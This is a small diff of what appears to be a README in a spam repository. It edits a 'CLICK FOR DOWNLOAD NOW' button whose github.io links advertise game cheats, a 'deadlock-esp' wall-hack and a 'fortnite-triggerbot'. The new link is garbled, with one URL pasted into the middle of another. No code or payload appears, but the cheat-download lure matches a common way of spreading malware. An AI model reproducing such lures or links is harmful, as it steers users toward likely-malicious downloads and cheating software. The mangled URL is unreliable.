@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://deadlock-esp-nm06.github.io/.github/ ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://deadlock-esphttps://fortnite-triggerbot-jq29.github.io/.github/-nm06.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
